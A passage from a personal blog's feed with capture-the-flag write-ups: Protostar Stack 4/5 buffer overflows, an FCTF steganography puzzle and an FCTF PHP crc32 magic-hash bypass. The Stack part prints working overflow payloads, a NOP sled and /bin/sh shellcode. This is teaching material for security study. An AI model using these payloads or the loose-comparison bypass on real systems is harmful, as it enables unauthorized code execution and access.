+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack4.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>void win()
+</span><span class='line'>{
+</span><span class='line'>  printf("code flow successfully changed\n");
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  gets(buffer);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This piece of code is so brief. Same idea as Stack 3, we must change code flow to <code>win</code> function, however there is no <code>fb</code> for us overwrite.</p>
+
+<blockquote><p>It&rsquo;s time for EIP.</p></blockquote>
+
+<p>When disassembly main function, we have:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb -q stack4
+</span><span class='line'>Reading symbols from stack4...done.
+</span><span class='line'>gdb-peda$ disass main
+</span><span class='line'>Dump of assembler code for function main:
+</span><span class='line'>   0x08048408 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x08048409 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x0804840b &lt;+3&gt;:     and    esp,0xfffffff0
+</span><span class='line'>   0x0804840e &lt;+6&gt;:     sub    esp,0x50
+</span><span class='line'>   0x08048411 &lt;+9&gt;:     lea    eax,[esp+0x10]
+</span><span class='line'>   0x08048415 &lt;+13&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x08048418 &lt;+16&gt;:    call   0x804830c &lt;gets@plt&gt;
+</span><span class='line'>   0x0804841d &lt;+21&gt;:    leave
+</span><span class='line'>   0x0804841e &lt;+22&gt;:    ret
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>gdb-peda$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After <code>leave</code> instructor in <code>*main+21</code>, the program will call the function which has address equal to <code>EIP register</code>&rsquo;s value. The easiest way to pass this level is overwrite EIP.</p>
+
+<p>First of all, we need <code>EIP</code> &rsquo;s offset. Try inject <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234567</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb stack4
+</span><span class='line'>Reading symbols from stack4...done.
+</span><span class='line'>gdb-peda$ r
+</span><span class='line'>Starting program: /root/protostar/bin/stack4
+</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234567
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>[----------------------------------registers-----------------------------------]
+</span><span class='line'>EAX: 0xffffda90 ('A' &lt;repeats 74 times&gt;, "1234567")
+</span><span class='line'>EBX: 0x0
+</span><span class='line'>ECX: 0xf7fca5a0 --&gt; 0xfbad2288
+</span><span class='line'>EDX: 0xf7fcb87c --&gt; 0x0
+</span><span class='line'>ESI: 0x1
+</span><span class='line'>EDI: 0xf7fca000 --&gt; 0x1b5db0
+</span><span class='line'>EBP: 0x32314141 ('AA12')
+</span><span class='line'>ESP: 0xffffdae0 --&gt; 0x37 ('7')
+</span><span class='line'>EIP: 0x36353433 ('3456')
+</span><span class='line'>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+</span><span class='line'>[-------------------------------------code-------------------------------------]
+</span><span class='line'>Invalid $PC address: 0x36353433
+</span><span class='line'>[------------------------------------stack-------------------------------------]
+</span><span class='line'>0000| 0xffffdae0 --&gt; 0x37 ('7')
+</span><span class='line'>0004| 0xffffdae4 --&gt; 0xffffdb74 --&gt; 0xffffdca3 ("/root/protostar/bin/stack4")
+</span><span class='line'>0008| 0xffffdae8 --&gt; 0xffffdb7c --&gt; 0xffffdcbe ("USER=root")
+</span><span class='line'>0012| 0xffffdaec --&gt; 0x0
+</span><span class='line'>0016| 0xffffdaf0 --&gt; 0x0
+</span><span class='line'>0020| 0xffffdaf4 --&gt; 0x0
+</span><span class='line'>0024| 0xffffdaf8 --&gt; 0xf7fca000 --&gt; 0x1b5db0
+</span><span class='line'>0028| 0xffffdafc --&gt; 0x8048218 --&gt; 0x675f5f00 ('')
+</span><span class='line'>[------------------------------------------------------------------------------]
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0x36353433 in ?? ()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have &lsquo;0x36353433&rsquo; (equal to <code>3456</code> in ascii).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = prefix + target_address
+</span><span class='line'>prefix = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, we will find address of <code>win</code> function through the previous way.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ disass win
+</span><span class='line'>Dump of assembler code for function win:
+</span><span class='line'>   0x080483f4 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x080483f5 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x080483f7 &lt;+3&gt;:     sub    esp,0x18
+</span><span class='line'>   0x080483fa &lt;+6&gt;:     mov    DWORD PTR [esp],0x80484e0
+</span><span class='line'>   0x08048401 &lt;+13&gt;:    call   0x804832c &lt;puts@plt&gt;
+</span><span class='line'>   0x08048406 &lt;+18&gt;:    leave
+</span><span class='line'>   0x08048407 &lt;+19&gt;:    ret
+</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>=> 0x080483f4</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = prefix + target_address
+</span><span class='line'>prefix = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12"
+</span><span class='line'>target_address = "\xf4\x83\x04\x08"
+</span><span class='line'>payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12" + "\xf4\x83\x04\x08"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Compose input file and inject to program</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  python2 -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12" + "\xf4\x83\x04\x08"' &gt; input4.b
+</span><span class='line'>➜  ./stack4 &lt; input4.b
+</span><span class='line'>code flow successfully changed
+</span><span class='line'>[1]    50114 segmentation fault (core dumped)  ./stack4 &lt; input4.b</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>STACK 5</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack5.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  gets(buffer);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is not <strong>win()</strong> function, just two line for initialization and read input. &ldquo;Have you ever forgetten copying some thing ?&rdquo;</p>
+
+<p>Don&rsquo;t worry, it is the great chance for us to make friend with shellcode.
+We should overwrite EIP (using technique from previous challenge) in order to redirect program execution to our shellcode, which also was injected to input data.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = flushdata + bufaddr + nopdata + shellcode</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Easily to recognize that</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>flushdata = 'A' * 76</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>bufaddr</strong> points to shellcode&rsquo;s address in Stack. Using <strong>gdb</strong>, we have:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bufaddr = pack("&lt;I", 0xffffdbe0)</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>nopdata</strong> was used to avoid the different between the memory address inside gdb and outside.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nopdata = "\x90" * 66</span></code></pre></td></tr></table></div></figure>
+
+
+<blockquote><p>What is <strong>shellcode</strong> ? Where should we find <strong>shellcode</strong> ?</p></blockquote>
+
+<p>We can build our shellcode through using <strong>msfvenom</strong> in msf framework.</p>
+
+<p>This is shellcode i using:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Combine all of them together and <strong>dd</strong> whatever you want :D</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[FCTF White Steganography Writeup]]></title>
+    <link href="http://tungpun.github.io/blog/2015/08/06/fctf-white-steganography-writeup/"/>
+    <updated>2015-08-06T18:20:57+00:00</updated>
+    <id>http://tungpun.github.io/blog/2015/08/06/fctf-white-steganography-writeup</id>
+    <content type="html"><![CDATA[<p>In FCTF, there is a stegno challenge. It&rsquo;s quite simple, but, i had lost so this challenge took me about 40 mins.
+This is a reason for me to write about it today.</p>
+
+<p>I have a &ldquo;white&rdquo; picture:</p>
+
+<p><img src="http://i.imgur.com/2ukiJIf.png" alt="White" /></p>
+
+<p>When face a stegano challenge, the first thought in my mind is check metadata.</p>
+
+<p>I used to use <code>exiftool</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  fctf  exiftool 2ukiJIf.png
+</span><span class='line'>ExifTool Version Number         : 9.46
+</span><span class='line'>File Name                       : 2ukiJIf.png
+</span><span class='line'>Directory                       : .
+</span><span class='line'>File Size                       : 1088 bytes
+</span><span class='line'>File Modification Date/Time     : 2015:08:06 22:13:30-04:00
+</span><span class='line'>File Access Date/Time           : 2015:08:06 22:16:43-04:00
+</span><span class='line'>File Inode Change Date/Time     : 2015:08:06 22:16:43-04:00
+</span><span class='line'>File Permissions                : rw-r--r--
+</span><span class='line'>File Type                       : PNG
+</span><span class='line'>MIME Type                       : image/png
+</span><span class='line'>Image Width                     : 300
+</span><span class='line'>Image Height                    : 150
+</span><span class='line'>Bit Depth                       : 8
+</span><span class='line'>Color Type                      : RGB
+</span><span class='line'>Compression                     : Deflate/Inflate
+</span><span class='line'>Filter                          : Adaptive
+</span><span class='line'>Interlace                       : Noninterlaced
+</span><span class='line'>SRGB Rendering                  : Perceptual
+</span><span class='line'>Gamma                           : 2.2
+</span><span class='line'>Pixels Per Unit X               : 3779
+</span><span class='line'>Pixels Per Unit Y               : 3779
+</span><span class='line'>Pixel Units                     : Meters
+</span><span class='line'>Image Size                      : 300x150</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nothing to do more with exiftool.</p>
+
+<p>I try viewing the raw data as hex. Too complicated with a pure white image. Is something injected in that file ? or LSB implemented ?
+To ensure that, these forensics tools like <code>binwalk</code>, <code>foremost</code> and <code>stegsolve</code> can be useful.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  fctf  binwalk 2ukiJIf.png
+</span><span class='line'>
+</span><span class='line'>DECIMAL       HEXADECIMAL     DESCRIPTION
+</span><span class='line'>--------------------------------------------------------------------------------
+</span><span class='line'>0             0x0             PNG image, 300 x 150, 8-bit/color RGB, non-interlaced
+</span><span class='line'>91            0x5B            Zlib compressed data, compressed</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I check zlib compressed data, but it is not what we need.
+Now is your time, <code>foremost</code> !</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  fctf  foremost -i 2ukiJIf.png
+</span><span class='line'>Processing: 2ukiJIf.png
+</span><span class='line'>|*|</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I also spend ~20mins with StegSolve to ensure that file is not pure white.</p>
+
+<p>Anything i have ignored ?</p>
+
+<blockquote><p>Never give up</p></blockquote>
+
+<p>I write a piece of code to highlight the pixel which is not pure white (255, 255, 255)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python2.7
+</span><span class='line'>
+</span><span class='line'>import cv2
+</span><span class='line'>import numpy as np
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>  img = cv2.imread('2ukiJIf.png', 0)  
+</span><span class='line'>  s = ''
+</span><span class='line'>  for x in range(150):
+</span><span class='line'>      for y in range(300):    
+</span><span class='line'>          if img[x][y] != 255:                            
+</span><span class='line'>              s += '+'
+</span><span class='line'>          else:
+</span><span class='line'>              s += ' '
+</span><span class='line'>      s += '\n'
+</span><span class='line'>  f = open("out.txt", "w")
+</span><span class='line'>  f.write(s)  </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Luck me, after openning the out file, i get flag.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                  ++                                                                       ++                                                                                                      ++                                                                   
+</span><span class='line'>                                                  ++                                                                       ++                                                                                                      ++                                                                   
+</span><span class='line'>                                                                          ++                                                                                         ++                                                            ++                                                                   
+</span><span class='line'>                                                                          ++                                                                                         ++                                                            ++                                                                   
+</span><span class='line'>                                                  ++   ++    ++   ++++   +++++           ++++     ++++     ++++            ++   ++++            ++ +++      ++++    +++++            ++++   ++ +++      ++++    ++    ++   +++++++ ++ +++                                                               
+</span><span class='line'>                                                  ++   ++    ++  ++   +   ++            ++   +   ++  ++   ++  ++           ++  ++   +           +++  ++    ++  ++    ++             ++  ++  +++  ++    ++  ++   ++    ++  ++   ++  +++  ++                                                              
+</span><span class='line'>                                                  ++   ++    ++  ++       ++            ++      ++   ++  ++   ++           ++  ++               ++    ++  ++    ++   ++            ++   ++  ++    ++  ++    ++  ++    ++  ++   ++  ++    ++                                                             
+</span><span class='line'>                                                  ++   ++    ++  +++      ++            +++     ++   ++  ++   ++           ++  +++              ++    ++  ++    ++   ++            ++   ++  ++    ++  ++    ++  ++    ++  ++   ++  ++    ++                                                             
+</span><span class='line'>                                                  ++   ++    ++   ++++    ++             ++++   +++++++  +++++++           ++   ++++            ++    ++  ++    ++   ++            +++++++  ++    ++  ++    ++  ++    ++  ++   ++  ++    ++                                                             
+</span><span class='line'>                                                  ++   ++    ++     +++   ++               +++  ++       ++                ++     +++           ++    ++  ++    ++   ++            ++       ++    ++  ++    ++  ++    ++   +++++   ++    ++                                                             
+</span><span class='line'>                                                  ++   ++    ++      ++   ++                ++  ++       ++                ++      ++           ++    ++  ++    ++   ++            ++       ++    ++  ++    ++  ++    ++  ++       ++    ++                                                             
+</span><span class='line'>                                                  ++    ++  +++  +   ++   ++            +   ++   ++   +   ++   +           ++  +   ++           ++    ++   ++  ++    ++             ++   +  ++    ++   ++  ++    ++  +++   ++++++  ++    ++                                                             
+</span><span class='line'>                                                  ++     +++ ++   ++++     +++           ++++     ++++     ++++            ++   ++++            ++    ++    ++++      +++            ++++   ++    ++    ++++      +++ ++  ++    ++ ++    ++                                                             
+</span><span class='line'>                                                  ++                                                                                                                                                                      ++    ++                                                                      
+</span><span class='line'>                                                  ++                                                                                                                                                                      ++    ++                                                                      
+</span><span class='line'>                                                +++                           +++++++++                          +++++++++            +++++++++                          +++++++++                                         ++++++                                                                       
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                                        
+</span><span class='line'>                                                                                                                                                                                                                                                                                          
+</span><span class='line'>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>Quite simple, right ? :D</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[FCTF Easy PHP Writeup]]></title>
+    <link href="http://tungpun.github.io/blog/2015/08/06/fctf-easy-php/"/>
+    <updated>2015-08-06T13:49:02+00:00</updated>
+    <id>http://tungpun.github.io/blog/2015/08/06/fctf-easy-php</id>
+    <content type="html"><![CDATA[<p>Last week, when feed my brain with CTF, i face a web challenge. Luckily, with the help from my friend, i solve it.
+This challenge may be easy, but with me, it is interesting and i study something. So, tonight, i spend my gaming time to explain about this.</p>
+
+<p>My English is terrible, however, i will try with my best.</p>
+
+<p>This challenge give us the url to the web page which have written by php. For personal reason, i can&rsquo;t show it here.</p>
+
+<p>Here we go,
+after viewing source, i discover the piece of backend code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
+</span><span class='line'>
+</span><span class='line'>    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
+</span><span class='line'>    function crc32_string($v){return sprintf("%08x", crc32($v) & 0xffffffff);}
+</span><span class='line'>
+</span><span class='line'>    $value = (isset($_POST['value']) && is_string($_POST['value'])) ? $_POST['value'] : '';
+</span><span class='line'>
+</span><span class='line'>    $flag = ($value !== "" && $value !== "ecTmZcC" && crc32_string($value) == crc32_string('ecTmZcC')) ? 'CENSORED': 'bad value';
+</span><span class='line'>?&gt;
+</span><span class='line'>&lt;!DOCTYPE html&gt;
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>  &lt;head&gt;
+</span><span class='line'>    &lt;meta charset="utf-8"&gt;
+</span><span class='line'>    &lt;title&gt;For PHP Expert&lt;/title&gt;
+</span><span class='line'>  &lt;/head&gt;
+</span><span class='line'>  &lt;body&gt;
+</span><span class='line'>    &lt;p&gt;
+</span><span class='line'>       PHP is a magic language &lt;3. &lt;br&gt;Enter a good value and I'll give you flag ;)
+</span><span class='line'>    &lt;/p&gt;
+</span><span class='line'>    &lt;form method="POST"&gt;
+</span><span class='line'>      &lt;div&gt;Value: &lt;input type="text" name="value" value="&lt;?php echo h($value); ?&gt;"&gt;&lt;/div&gt;
+</span><span class='line'>      &lt;br&gt;
+</span><span class='line'>      &lt;div&gt;&lt;input type="submit" value="Submit"&gt;&lt;/div&gt;
+</span><span class='line'>    &lt;/form&gt;
+</span><span class='line'>    &lt;br&gt;
+</span><span class='line'>    &lt;?php echo $flag ?&gt;
+</span><span class='line'>  &lt;/body&gt;
+</span><span class='line'>  &lt;!-- magic.phps --&gt;
+</span><span class='line'>&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you see, to solve this challenge, we have to find a <code>value</code> , which is not <code>ecTmZcC</code> but its crc32 is equal to <code>ecTmZcC</code>&rsquo;s crc32 :|</p>
+
+<p>Seem like crazy, right ?</p>
+
+<p>Or you can think more positive: is something wrong with  <code>==</code> in php (php is famous for that) ?
+The key is <a href="https://blog.whitehatsec.com/magic-hashes/">Magic Hash</a></p>
+
+<p><code>ecTmZcC</code>&rsquo;s crc32 is <code>0e730435</code>. So, we must calculate a value which has crc32 hash similar &lsquo;0eXXXXXX&rsquo; (X is numeric).</p>
+
+<p>I write a Python script to find it.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>!#/usr/bin/python2.7
+</span><span class='line'>import binascii
+</span><span class='line'>
+</span><span class='line'>def CRC32(buf):    
+</span><span class='line'>    buf = (binascii.crc32(buf) & 0xFFFFFFFF)
+</span><span class='line'>    return "%08X" % buf
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>def chk(s, p):
+</span><span class='line'>  if s[:2] != p:
+</span><span class='line'>      return False
+</span><span class='line'>  for c in s[2:]:
+</span><span class='line'>      if '0' &lt;= c &lt;= '9':
+</span><span class='line'>          ok = 1
+</span><span class='line'>      else:
+</span><span class='line'>          return False
+</span><span class='line'>  return True
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>  pattern = CRC32('ecTmZcC')[:2]  # 0e
+</span><span class='line'>  i = 0
+</span><span class='line'>  while True:
+</span><span class='line'>      if chk(CRC32(str(i)), pattern):         
+</span><span class='line'>          print 'value:', i
+</span><span class='line'>          break   
+</span><span class='line'>      i += 1      </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Finally, we have the answer: <strong>6586</strong> and got flag :D</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[First Post]]></title>
+    <link href="http://tungpun.github.io/blog/2015/08/06/first-post/"/>
+    <updated>2015-08-06T09:15:43+00:00</updated>
+    <id>http://tungpun.github.io/blog/2015/08/06/first-post</id>
